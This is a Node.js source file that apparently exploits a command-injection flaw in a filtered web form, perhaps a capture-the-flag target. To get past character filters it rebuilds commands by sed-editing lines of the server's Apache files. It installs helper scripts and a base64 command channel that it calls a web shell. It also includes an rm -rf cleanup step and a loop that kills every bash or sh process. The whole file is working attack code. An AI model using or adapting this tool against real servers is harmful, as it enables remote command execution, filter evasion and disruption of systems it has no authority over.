//@ts-check

//=============================
// Dependent files:
//    /etc/php/etc/init.d/apache2
//    /etc/php/etc/apache2/apache2.conf
//=============================
let { create } = require('./request');
let bash = require('./bash');
let config = require('../config'),
	workspace = config.path.workspace,
	workspaceChars = config.path.characters,
	lessTemp = config.lessTemporaryFile;
	
let req = create(inputFormatter, responseFormatter);
let noResponseContent = false;
let initSuccessCount = 0, allSuccessCount = 0;

// Util scripts location
const EXECUTABLE = workspace + 'ex';
// const CONCAT = workspace + 'cc'; //cc fileTo file1 file2 ...
const AB2C = workspace + 'ab2c';
const SAFE_BASE64 = workspace + 'sb64'; //sb64 file safeBase64.part1 safeBase64.part2 ....
const TMP_INSTALL_CHAR = workspace + 'ctp';

module.exports = {
	createRequestContainer: create,

	shell, slowShell,

	inputFormatter, responseFormatter,
	
	config, 

	installWorkspaceOnServer, destroyWorkspace,
};

//======================================
//#region functions: build up basic workspace on server
function installWorkspaceOnServer() { 
	step0BuildWorkspace();
	allSuccessCount++;

	step1PreInstallCharFiles();
	allSuccessCount++;
	
	for (let i = 0; i < 4; i++) {
		step1InstallCharFiles(i);
		allSuccessCount++;
	}
	
	step2BuildSomeTools();
	allSuccessCount++;

	step3UpgradeTools();
	allSuccessCount++;
}

function step0BuildWorkspace() { 
	let edit = createTurnOverTempEditor('/tmp/10086', '/tmp/10010');
	exec([
		//    while kill -0 "${PIDTMP:-}" 2> /dev/null;  do
		edit.loadLine('/etc/php/etc/init.d/apache2', 131),
		edit.replace([
			// mkdir -p
			['while.', 'm'], ['ill', 'dio'], ['o', 'r'], ['0<29>', 'p'],
			['do', workspaceChars]
		]),
		edit.bashExec(),
		bash.stat(workspaceChars)
	], (result, code) => {
		if (result.indexOf(workspaceChars) <= 0
			|| !result.match(/Size.+Blocks.+directory/)
			|| !result.match(/Access.+Uid.+Gid/))
			return console.error(`0. error: install workspace folder failed!(${code})`);
		console.log(`0. success: installed workspace folder, deepest path: ${workspaceChars} (${code})`);
		initSuccessCount++;
	});
}
function destroyWorkspace() { 
	let edit = createTurnOverTempEditor();
	exec([
		//    while kill -0 "${PIDTMP:-}" 2> /dev/null;  do
		edit.loadLine('/etc/php/etc/init.d/apache2', 131),
		edit.replace([['while', 'rip'], ['ip<5>', 'm'], ['0', 'rf'], ['<3>PIDTMP<22>', workspace]]),
		edit.viewHex(),
		edit.bashExec(),
	], (result, code) => {
		if (!result.match(/72\s?6d/))
			return console.error(`\nerror: destroy workspace folder failed, maybe you have not init! (${code})\n`);
		console.log(`\nsuccess: destroy workspace folder (${code})\n`);
	});
}
function step2BuildSomeTools() { 
	let edit = createTurnOverTempEditor(), turn = edit.turn;
	let cmd = [
		//==================================
		// ex: ex $SCRIPT_NAME
		//     make script executable
		//==================================
		// /etc/php/etc/init.d/apache2:188:
		// if [ -e $PIDFILE ] && pidof $DAEMON | tr ' ' '\n' | grep -w $(cat $PIDFILE) > /dev/null 2>&1 ; then
		edit.loadLine('/etc/php/etc/init.d/apache2', 188),
		//chmod
		edit.replace([
			['if<49>', 'chmod'], ['grep<9>', '777'], ['PIDFILE<25>', '1']
		]),
		edit.copyTo(EXECUTABLE),
		//make itself executable
		bash.executeBashScript(EXECUTABLE, EXECUTABLE),
		bash.viewHexFile(EXECUTABLE),
		// 'debug_break',

		//==================================
		// ab2c: ab2c $FILENAME1 $FILENAME2 $FILENAME3
		//    cat $a $b | sed w$c
		//==================================
		// /etc/php/etc/init.d/apache2:188:
		// if [ -e $PIDFILE ] && pidof $DAEMON | tr ' ' '\n' | grep -w $(cat $PIDFILE) > /dev/null 2>&1 ; then
		edit.loadLine('/etc/php/etc/init.d/apache2', 188),
		edit.replace([
			['if<5>', 'cao'], ['PIDFILE<11>', '1'], ['DAEMON<14>', '2'],
			['grep...', 'sed'], ['...at.', 'w'],
			['PIDFILE<25>', '3'],
			['ao', 'at'] //cao => cat
		]),
		// install (copy, executable, stat)
		edit.copyTo(AB2C),
		bash.execute(EXECUTABLE, AB2C),
		bash.viewHexFile(AB2C),
	];
	exec(cmd, (result, code) => {
		if (!result.match(/63\s?68\s?6d\s?6f\s?64/) || //hex: chmod
			!result.match(/63\s?61\s?74/)) //hex: cat
			return console.error(`2. error: install basic tools failed!(${code})`);
		console.log(`2. success: installed basic tools: ${EXECUTABLE} and ${AB2C} (${code})`);
		initSuccessCount++;
	});
}
function step1PreInstallCharFiles() { 
	let edit = createTurnOverTempEditor();
	let cmds = [
		//  LogFormat "%v:%p %h %l %u %t \"%r\" %>s %O \"%{Referer}i\" \"%{User-Agent}i\"" vhost_combined
		//  validate hex codes:
		//  4c6f 6746 6f72 6d61 7420 2225 763a 2570  LogFormat "%v:%p
		//  686f 7374 5f63 6f6d 6269 6e65 640a       host_combined.
		edit.loadLine('/etc/php/etc/apache2/apache2.conf', 206),
		edit.copyTo(TMP_INSTALL_CHAR),
		bash.viewHexFile(TMP_INSTALL_CHAR)
	];
	exec(cmds, (result, code) => {
		if (result.indexOf('4c6f 6746 6f72 6d61 7420 2225 763a 2570') <= 0
			|| result.indexOf('686f 7374 5f63 6f6d 6269 6e65 640a') <= 0)	
			return console.error(`1. error: pre-install character files failed!(${code})`);
		console.log(`1. success: pre-installed character files, path: ${TMP_INSTALL_CHAR} (${code})`);
		initSuccessCount++;
	});
}
/** @param {number} part  0|1|2|3 */
function step1InstallCharFiles(part) {
	let P = [[10, 13], [32, 64], [64, 96], [96, 127]];
	let edit = createTurnOverTempEditor();
	let cmd = []; let test = [];
	//=============================================
	// Generate workspaceChars/OCT_NUMBER single character file
	//=============================================
	for (let i = P[part][0], j = P[part][1]; i < j; i++) { 
		let oct = toOctString(i);

		let target = workspaceChars + oct;
		cmd = cmd.concat([
			edit.loadLine(TMP_INSTALL_CHAR, 1),
			edit.replace([
				['L.g.o..at<28>', 'printf'], ['s..O', target],
				['...Referer..', ''], ['<6>User<26>', oct]
			]),
			edit.bashExec(),
			bash.viewHexFile(target),
		]);
		test.push(toHexString(i));
	}
	exec(cmd, (result, code) => {
		for (let hex of test)
			if (!result.match(new RegExp('00000000:\\s' + hex)))	
				return console.error(`1. error: install character file{0x${hex}} failed! (${code})`);
		console.log(`1. success: installed part ${part}/${P.length} of character files (${code})`);
		initSuccessCount++;
	});
}
function step3UpgradeTools() {
	//upgrade ab2c tools for less output
	slowShell(`echo 'cat $1 $2 > $3' > ${AB2C}`, null, true,
		(result, code) => console.log(`3. upgraded ${AB2C}`));
	// slowShell(`echo '>$1;for file in "\${@:2}"; do cat "$file" >> $1;done' > ${CONCAT}`);
	slowShell(`echo '#!/bin/bash
		echo "\${@:2}" | tr -d " " | 
		sed "s:_a:k:g" | sed "s:_b:K:g" | sed "s:_c:+:g" | sed "s:_d:=:g" |
		base64 --decode > $1' > ${SAFE_BASE64}`, null, true,
		(result, code) => console.log(`3. installed ${SAFE_BASE64}`));
	// slowShell(`chmod +x ${CONCAT};`);
	slowShell(`chmod +x ${SAFE_BASE64};`, null, true,
		(result, code) => console.log(`3. make ${SAFE_BASE64} executable`));
	// shell function could be use if SAFE_BASE64 be installed
	shell('S1=Hello;S3=Shell;S2=My;echo "$S1$S2$S3;"', (result, code) => {
		if (result.indexOf('HelloMyShell') < 0)
			console.error(`3. error: upgrade tools failed! (${code})`);
		else
			console.log(`3. success: upgraded tools {${AB2C}, ${SAFE_BASE64}} (${code})`);

		initSuccessCount++;
		if (initSuccessCount < allSuccessCount)
			return console.error(`\nInit failed: (${initSuccessCount}/${allSuccessCount})\n`);
		console.log(`\nInit success, now you can use repl and shell function now!\n`)
	});
	
}
//#endregion
//=====================================

/**
 * Web-Shell (slow) (but it build up quick shell)
 * @param {string} cmd bash script/commands/text file
 * @param {string} [filePath] default is temporary file 
 * @param {boolean} [execIt] execute it
 */
function slowShell(cmd = '  ', filePath = '', execIt = true, callback = null) { 
	let cmdChars = cmd.split('').map(v => toOctString(v.charCodeAt(0)))
		.filter(v => v.length <= 3 && v.length > 0);
	
	if (cmdChars.length != cmd.length) { 
		console.error(`\n  error: invalid command(included invalid characters):\n  ${cmd}\n\n`);
		process.exit(1);
	}

	//padding
	const SPACE = '040';
	cmdChars = cmdChars.concat([SPACE, SPACE]);
	if (cmdChars.length % 2 != 0)
		cmdChars.push(SPACE);

	let charFile = cmdChars.map(oct => workspaceChars + oct);
	let edit = createTurnOverTempEditor();

	/** @type {any[]} */
	let cmds = [ bash.execute(AB2C, charFile[0], charFile[1], edit.f1) ];
	for (let i = 2; i < charFile.length; i += 2) { 
		cmds.push(bash.execute(AB2C, charFile[i], charFile[i + 1], edit.f1 + 't'));
		cmds.push(bash.execute(AB2C, edit.f1, edit.f1 + 't', edit.f2));
		edit.turn();
	}
	if (filePath)
		cmds.push(edit.copyTo(filePath));	

	if(execIt)
		cmds.push(bash.executeBashScript(edit.f1));
	// console.log(cmds);
	exec(cmds, callback);	
}
/** @param {string|Buffer} cmd */
function shell(cmd, callback, filePath = '', execIt = true) { 
	const ascii9 = '9'.charCodeAt(0);
	let buffer = typeof cmd == 'string' ? new Buffer(cmd) : cmd;
	let base64 = buffer.toString('base64').split('')
		.map(v => {
			if (v == 'k') return `_a`;
			if (v == 'K') return `_b`;
			if (v == '+') return `_c`;
			if (v == '=') return `_d`;
			if (v.charCodeAt(0) <= ascii9) return v;
			return ` ` + v;
		}).join('');
	let file = filePath || createTurnOverTempEditor().f1;
	let cmds = [`${SAFE_BASE64} ${file} ${base64}`];
	if (execIt)
		cmds.push(bash.executeBashScript(file));
	req.exec(cmds, callback);
}
//sb64 /tmp/php/8a Z W N o b y B o Z W x s b 3 d v c m x _a I Q _d _d

/**
 * kill all bash/sh processes
 */
function cleanOldShProcesses(shName = 'bash') {
	exec([
		// Original command:
		//    while kill -0 "${PIDTMP:-}" 2> /dev/null;  do
		`sed 131w/tmp/tmp.1 /etc/php/etc/init.d/apache2;`,
		`sed s:while::w/tmp/tmp.2 /tmp/tmp.1;`,
		`sed s:ill...............................:illall:w/tmp/tmp.1 /tmp/tmp.2;`,
		`sed s:do:${shName}:w/tmp/tmp.2 /tmp/tmp.1;`,
		`nl /tmp/tmp.2;`,
		//execute
		`while true; do /bin/${shName=='sh'?'bash':'sh'} /tmp/tmp.2; done`]);
}	

function toOctString(i = 0) { 
	let oct = i.toString(8);
	if (oct.length == 1) return '00' + oct;
	else if (oct.length == 2) return '0' + oct;
	return oct;
}
function toHexString(i = 0) { 
	let hex = i.toString(16);
	if (hex.length == 1) return '0' + hex;
	return hex;
}

/**
 * you can use it to do codes like follow easy:
 * sed s:abc:1:wFile2 File1;
 * sed s:xyz:2:wFile1 File2;
 *
 * @param {string} [f1] default: auto generate under workspace 
 * @param {string} [f2] default: ~ 
 */
function createTurnOverTempEditor(f1 = '', f2 = '') {
	if (!f1 || !f2) {
		let now = String(Date.now());
		now = lessTemp ? now.slice(-2, -1) : now.slice(7);
		f1 = workspace + now + 'a';
		f2 = workspace + now + 'b';
	}

	let context = {
		get f1() { return f1 }, get f2() { return f2 },
		turn() { let t = f1; f1 = f2; f2 = t; },
		replaceOnce(from, to) { 
			//Make "<10>" => ".........." (match 10 any characters)
			from = from.replace(/\<(\d+)\>/g, (_, num) => new Array(parseInt(num)).fill('.').join(''));
			let cmd = bash.replaceOnceInEachLine(from, to, f1, f2);
			context.turn();
			return cmd;
		},
		/** @param {[string, string][]} replaceArray */
		replace(replaceArray) { 
			/** @type {string[]} */
			let cmd = [];
			replaceArray.map(([from, to]) => cmd.push(context.replaceOnce(from, to)));
			return cmd;
		},
		loadLine(file, lineNo) { return bash.readOneLineToFile(lineNo, file, f1); },
		copyTo(file) { return bash.copyTextFile(f1, file); },
		bashExec() { return bash.executeBashScript(f1) },
		viewHex() { return bash.viewHexFile(f1); }
	}
	return context;
}


/**
 * @param {(string|(string[]))[]} commands
 * @param {(result: string, code: number) => any} callback
 **/
function exec(commands, callback = null) { req.exec(commands, callback || displayResponse); }
function inputFormatter(input = '') { return `;\n${input.replace(/ /g, '\t')}`; }
function responseFormatter(result = '', statusCode = 0) {
	let index = result.indexOf('<pre>');
	return result.slice(index + 5 + 'your name is:'.length)
		.replace(/<\/pre>$/, '')
		.trim();
}
function displayResponse(result, statusCode) { 
	console.log(`response: ${statusCode} =>`);
	console.log(result);
}